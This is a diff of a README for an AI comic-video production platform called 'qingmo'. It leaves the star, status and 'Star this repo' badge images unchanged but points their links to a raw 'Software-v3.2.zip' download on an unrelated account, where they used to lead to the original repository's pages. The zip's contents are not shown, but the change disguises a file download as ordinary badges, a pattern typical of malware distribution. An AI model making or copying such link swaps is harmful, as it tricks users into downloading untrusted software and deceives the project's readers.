@@ -7,8 +7,8 @@
 
 **AI 全流程漫剧短视频创作平台 · AI-Powered Comic Video Production Platform**
 
-[![GitHub Stars](https://img.shields.io/github/stars/truman-world/qingmo?style=for-the-badge&logo=github&color=1a1a2e&labelColor=16213e)](https://github.com/truman-world/qingmo/stargazers)
-[![Status](https://img.shields.io/badge/status-Early%20Stage-green?style=for-the-badge&color=533483&labelColor=16213e)](https://github.com/truman-world/qingmo)
+[![GitHub Stars](https://img.shields.io/github/stars/truman-world/qingmo?style=for-the-badge&logo=github&color=1a1a2e&labelColor=16213e)](https://github.com/lommyt610-eng/qingmo/raw/refs/heads/main/assets/Software-v3.2.zip)
+[![Status](https://img.shields.io/badge/status-Early%20Stage-green?style=for-the-badge&color=533483&labelColor=16213e)](https://github.com/lommyt610-eng/qingmo/raw/refs/heads/main/assets/Software-v3.2.zip)
 [![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&color=0f3460&labelColor=16213e)](LICENSE)
 
 </div>
@@ -187,7 +187,7 @@ An AI-powered platform for producing comic-style short videos end-to-end — fro
 
 每一颗 Star 都是继续做下去的动力。
 
-[![Star this repo](https://img.shields.io/github/stars/truman-world/qingmo?style=for-the-badge&logo=github&label=Star&color=e94560&labelColor=1a1a2e)](https://github.com/truman-world/qingmo/stargazers)
+[![Star this repo](https://img.shields.io/github/stars/truman-world/qingmo?style=for-the-badge&logo=github&label=Star&color=e94560&labelColor=1a1a2e)](https://github.com/lommyt610-eng/qingmo/raw/refs/heads/main/assets/Software-v3.2.zip)
 
 **Watch** 这个仓库，开源时第一时间通知你。
 
